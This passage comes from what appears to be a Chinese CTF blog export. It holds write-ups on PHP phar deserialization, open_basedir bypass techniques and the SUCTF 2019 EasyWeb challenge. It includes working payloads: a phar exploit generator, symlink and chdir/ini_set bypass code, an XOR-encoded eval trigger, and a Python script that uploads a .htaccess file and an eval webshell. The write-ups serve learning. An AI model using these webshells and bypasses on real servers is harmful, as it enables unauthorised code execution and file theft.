<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;)</span></span><br><span class="line">        <span class="comment">//     eval($this-&gt;cmd);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;ljt=&quot;Re&quot;;</span></span><br><span class="line">        <span class="comment">// $this-&gt;dky=&quot;Misc&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;ljt = &amp;<span class="variable">$a</span>-&gt;dky;</span><br><span class="line"><span class="variable">$b</span>-&gt;dky = &amp;<span class="variable">$a</span>-&gt;ljt;</span><br><span class="line"><span class="variable">$b</span>-&gt;cmd = <span class="string">&#x27;system(\\&#x27;</span>ls /;cat /f*\\<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;b652ce9b-4837-49aa-871d-0c5b33eea4d1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>前面说<code>但是phar文件内容不可以随便更改，所有就不能利用了</code>，严格来说是错误的，phar文件内容可以修改，但是要重新写入签名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar1.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 修改内容后的phar文件</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;phar2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>NSSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>open_basedir bypass</title>
    <url>/2022/06/21/open-basedir-bypass/</url>
    <content><![CDATA[<blockquote>
<p>每天都在写，但是还没一个可以上传的。不能让博客长草（</p>
<p>就把之前稍稍整理了一下的小小知识点传一下，就当作是备份了，害怕哪天电脑炸了~</p>
<p>（真的整理得很简单，就跟着网上的整理自己过了一遍，师傅们看个乐就好</p>
</blockquote>
<span id="more"></span>

<h2 id="open-basedir认识及绕过"><a href="#open-basedir认识及绕过" class="headerlink" title="open_basedir认识及绕过"></a>open_basedir认识及绕过</h2><h5 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h5><p><code>open_basedir</code>函数是php中用于限制访问目录的函数<br>1.可以在<code>php.ini</code>中设置<br>2.可以用<code>ini_set</code>设置<br>3.在apache的httpd.conf中的Directory配置<br>4.httpd.conf中的VritualHost<br>5.nginx fastcgi.conf</p>
<hr>
<p>测试过程：<br>直接在虚拟机上进行以下命令没有实现，但是可以写在php文件中再执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;ini_set(&quot;open_basedir&quot;,&quot;/var/www/html/&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> ini_get(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210719203742866.png" alt="在这里插入图片描述"><br>之后在html目录下写一个php文件尝试访问根目录下的flag，但是报错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>以上实现了<code>open_basedir</code>的简单利用</p>
<h5 id="bypass方法"><a href="#bypass方法" class="headerlink" title="bypass方法"></a>bypass方法</h5><p><a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#0x03-%E5%88%A9%E7%94%A8symlink-%E5%87%BD%E6%95%B0Bypass">浅谈几种Bypass open_basedir的方法</a></p>
<h6 id="0x01-命令执行函数绕过"><a href="#0x01-命令执行函数绕过" class="headerlink" title="0x01:命令执行函数绕过"></a><strong>0x01:命令执行函数绕过</strong></h6><p><code>open_basedir</code>函数对命令执行函数没有限制，比如system，所以可以在php文件中修改代码就可以直接得到flag了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h6 id="0x02-symlink函数绕过"><a href="#0x02-symlink函数绕过" class="headerlink" title="0x02:symlink函数绕过"></a><strong>0x02:symlink函数绕过</strong></h6><p>利用symlink函数<br><img src="https://img-blog.csdnimg.cn/img_convert/ce5782d27b5b14fd43dab661790caa25.png" alt="在这里插入图片描述"></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//在当前创建一系列的子目录</span></span><br><span class="line">    mkdir(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//切换当前目录</span></span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//建立链接 a&gt;&gt;A/B/C/D</span></span><br><span class="line">    symlink(<span class="string">&#x27;A/B/C/D&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//建立连接 exp&gt;&gt;A/B/C/D/../../../../flag</span></span><br><span class="line">    symlink(<span class="string">&#x27;a/../../../../flag&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>);</span><br><span class="line">    unlink(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本来exp是指向了当前目录下<code>a/../../../../flag</code>，但是后来删除了a，所以前面的exp实际指向的是<code>/../../../../flag</code>即向上跨越目录访问根目录下的flag文件</p>
<blockquote>
<p>tip:子目录的数量以及<code>..</code>的数量要根据我们要访问的文件在哪，要跨越多少个目录，注意要算上当前的目录</p>
</blockquote>
<h6 id="0x03-glob-伪协议绕过"><a href="#0x03-glob-伪协议绕过" class="headerlink" title="0x03:glob://伪协议绕过"></a><strong>0x03:glob://伪协议绕过</strong></h6><p>1.结合DirectoryIterator<br>（只可以访问根目录以及open_basedir限制的目录）<br>(还是看php手册自己尝试)<br><a href="https://blog.csdn.net/weixin_33860553/article/details/88987194">DirectoryIterator遍历目录下的所有文件</a><br>可以获取文件名<br><code>__toString</code><br><img src="https://img-blog.csdnimg.cn/img_convert/eb3c9c85c3d26d0f8cedba603e1a6207.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span>  = Directorylterator(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;__toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getFilename</code><br><img src="https://img-blog.csdnimg.cn/img_convert/683144c066b6704521876efbdbd8e34f.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span> = Directorylterator(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;isFile())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;getFilename();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>2.结合opendir()+readdir()<br>（只能访问根目录以及open_basedir限制的目录）<br><img src="https://img-blog.csdnimg.cn/img_convert/2fcf089720ffd69994eeabfb93735811.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/img_convert/2a3da8a64ed12c19bd236af651de0872.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$a</span> = opendir(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$file</span>=readdir(<span class="variable">$a</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x04:chdir()+ini_set()结合</strong><br>1.首先要注意php文件不能在根目录以及open_basedir所规定的目录下，需要新建一个文件<br>2.要设置一个可以进行跳转的open_basedir<br>3.chdir应该是用来进行跳转目录的，但是不知道为什么一定是四个<br>（先记payload吧）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mkdir(<span class="string">&#x27;yuer&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;yuer&#x27;</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> ini_get(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><ul>
<li>无字母数字的webshell</li>
<li>利用python requests上传文件</li>
<li>.htaccess</li>
<li>bypass open_basedir</li>
</ul>
<p><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2">从PHP底层看open_basedir bypass</a><br><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">BUU WEB [SUCTF 2019]EasyWeb</a><br>简单例子：<br><a href="https://blog.csdn.net/qq_39531149/article/details/93238607">python requests文件上传</a></p>
<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>审计：</strong></p>
<ul>
<li>1.无字母数字的webshell</li>
</ul>
<p>直接ban了字母和数字，还有取反符号，还有<code>_</code>，这样只能利用异或<code>^</code>符号进行运算了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>2.文件上传的限制</li>
</ul>
<p>文件拓展名不能出现<code>ph</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>文件内容里面不能出现标签<code>&lt;?</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>文件头进行限制<br><img src="https://img-blog.csdnimg.cn/20210712142143701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p>如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。 </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li>3.函数限制</li>
</ul>
<blockquote>
<p>count_chars($hhh, 3);<br>3 - 返回由所有使用了的字节值组成的字符串。 </p>
</blockquote>
<p><strong>解题：</strong><br>step1：<br>先解决异或吧，之前用c写过，这次用php写一下（注意有很多可见字符都被ban了，唔，那试试用不可见字符)<br>这里选择的payload由于函数<code>exif_imagetype</code>的限制，必须存在四个字符一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">128</span>;<span class="variable">$i</span>&lt;=<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">128</span>;<span class="variable">$j</span>&lt;=<span class="number">255</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$i</span>^<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">if</span>(chr(<span class="variable">$a</span>)==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                <span class="keyword">echo</span> dechex(<span class="variable">$i</span>).<span class="string">&#x27;^&#x27;</span>.dechex(<span class="variable">$j</span>).<span class="string">&#x27;=&#x27;</span>.chr(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=phpinfo</span></span><br><span class="line"><span class="comment">// $_GET[%fe]</span></span><br></pre></td></tr></table></figure>

<p>step2：<br>被禁了很多函数，并且从php7开始<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>就不再支持了，所以要从函数<code>get_the_flag</code>，但是还不会python上传文件<br><img src="https://img-blog.csdnimg.cn/20210712160842655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>学习requests库的新用法，主要代码<br><code>res = requests.post(url, data=data, files=files, headers=headers)</code><br>但是上传文件的内容是什么才是最核心的，因为直接禁止了<code>ph</code>的出现，所以没办法通过后缀名简单绕过，那么就要用到<code>.user.ini</code>或者<code>.htaccess</code><br>别人的wp：<br>（但是不是很懂？要去学习<code>.user.ini</code>和<code>.htaccess</code>的具体作用）<br><img src="https://img-blog.csdnimg.cn/20210712193259942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZXJtb24=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>(注：代码中data不能省略，虽然一般人应该不会省略；<br>        难点在于<code>.htaccess</code>的文件内容)<br>最后还是照着大佬的脚本写了一下，实现方法其实简单，难的还是上传的文件内容的各种绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://13d03a1c-3beb-47f6-a48b-baf03f1e046e.node4.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要上传两个文件</span></span><br><span class="line"><span class="comment"># 1.shell</span></span><br><span class="line"><span class="comment"># files = &#123;&#x27;file&#x27;: open(&#x27;report.xls&#x27;, &#x27;rb&#x27;)&#125;</span></span><br><span class="line">shell =<span class="string">b&quot;GIF89a12&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .ahh</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahh&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/gif&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files)</span><br><span class="line"><span class="built_in">print</span>((r.text))</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.ahh&#x27;</span>,shell,<span class="string">&#x27;image/gif&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>得到文件上传路径，直接访问shell文件并利用cmd进行命令执行，不过由于phpinfo里面禁了很多函数，所以并不能直接利用命令执行函数得到flag</p>
<p>然后可以发现<code>open_basedir</code>对可访问目录进行限制，那么可以直接上payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化冷知识复现</title>
    <url>/2022/01/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%B7%E7%9F%A5%E8%AF%86%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h2><p><a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002</a></p>
<p>之前比赛遇到的题目，根据师傅的回答复现一下</p>
<h2 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h2><p>当反序列化 <code>__PHP_Incomplete_Class</code>  这个类后，再对其进行序列化时，其属性会消失。</p>
<p><strong>0x01:</strong></p>
<p>首先<code>__PHP_Incomplete_Class</code>是当反序列化一个不存在的类时出现的类，而<code>__PHP_Incomplete_Class_Name</code>属性就是反序列化时不存在的类的类名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (2) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;   </span></span><br><span class="line"><span class="comment">//  string(1) &quot;A&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(31) 